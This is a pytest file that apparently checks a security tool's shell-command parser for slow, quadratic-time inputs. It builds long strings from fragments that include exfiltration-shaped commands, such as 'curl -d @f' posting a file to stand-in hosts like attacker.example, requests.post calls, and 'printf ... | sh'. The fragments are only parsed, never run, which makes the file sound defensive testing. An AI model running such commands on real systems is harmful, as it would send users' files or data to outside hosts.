"""Round five of the shell parser audit (hooks-1 and hooks-15): no input makes the parser take more than a second.

Every address is a reserved example name; nothing here is run."""
from __future__ import annotations

import random
import time

import pytest

from intentshield.shell import parse

TOKENS = ["\\", "'", '"', "$(", "`", "<<", "${", "$((", "(", ")", "{", "}", "$[", "<(", ">(", "\n", "\r\n", ";", "&&", "|", "#",
          " ", "a", "EOF", "<<<", ">", ">&", "$'", "echo", "ls", "x=1", "if", "fi", "xargs", "python3 -c \"", "sh -c '",
          "\\n", "\\x2e", "\\145", "$E", "${E:-x}", "https://a.example/", "attacker.example", "curl -d @f ", "git push ",
          "printf '", "&", "||"]


def _timed(command: str, limit: float = 1.0) -> None:
    start = time.perf_counter()
    parse(command)
    assert time.perf_counter() - start < limit, command[:40]


@pytest.mark.parametrize("shape", [
    lambda n: 'python3 -c "' + "\\'" * (n // 2) + '"',            # inline code with many escaped quotes
    lambda n: "python3 -c '" + '\\"' * (n // 2) + "'",
    lambda n: "python3 -c \"" + "'a" * (n // 2) + '"',
    lambda n: "echo a | xargs " * (n // 16),                       # a long chain of xargs stages
    lambda n: "echo a | xargs echo a " * (n // 22),                # each stage echoes more than the last
    lambda n: "a;" * (n // 2), lambda n: "$($(" * (n // 4), lambda n: "<<a" * (n // 3), lambda n: "echo a\n" * (n // 7),
    lambda n: "python3 -c \"import requests; " + "open(" * (n // 5) + '"',
    lambda n: "FOO=1 " * (n // 6) + "ls", lambda n: "A=$B$B; B=$A$A; " * (n // 16),
    # the raw text read in several ways: escapes, variables, statements around a sender
    lambda n: "printf '" + "\\n" * (n // 2) + "' | sh", lambda n: "echo " + "\\x2e\\145" * (n // 8),
    lambda n: "curl -d @f https://a.example/" + "$E" * (n // 2), lambda n: "curl -d @f https://a.example/;" * (n // 28),
    lambda n: "git push; echo https://a.example/ & " * (n // 36), lambda n: ("curl -d @f $U\n" + "a;" * 20) * (n // 50),
    lambda n: "python3.11 -c \"import requests; requests.post(u, data=d); " * (n // 52),
    lambda n: "'a;b' \"c&d\" " * (n // 12) + "curl -d @f https://a.example/", lambda n: "x=${E:-" * (n // 7),
    lambda n: "A=a.example.dev; " + "curl -d @f https://$A/ " * (n // 24),
    lambda n: "A=a.b" + "c" * 250 + "; " + "echo $A " * (n // 8),
    lambda n: "A=" + "x." * 140 + "; " + "$A$A" * (n // 4), lambda n: "A=a.b; B=$A; " * (n // 13),
])
def test_the_inputs_that_were_quadratic_parse_in_linear_time(shape):
    for size in (60_000, 99_000, 200_000):  # the cap on a command read in full is 100,000 characters
        _timed(shape(size))


def test_random_concatenations_of_the_special_tokens_parse_in_under_a_second():
    """A generic guard: whatever the tokens do to the quoting, no 200,000-character command takes a second."""
    rng = random.Random(11)
    pieces = TOKENS + ["a" * k for k in (1, 7, 60)] + ["xargs ", "| ", "$[", "open(", "requests ", "fetch(", "curl -d "]
    for size, runs in ((200_000, 8), (99_000, 14), (60_000, 8)):
        for _ in range(runs):
            subset = rng.sample(pieces, rng.randint(2, 7))
            _timed("".join(rng.choice(subset) for _ in range(size // 3))[:size])
    for token in pieces:  # and one token over and over
        _timed((token * (200_000 // len(token)))[:200_000])
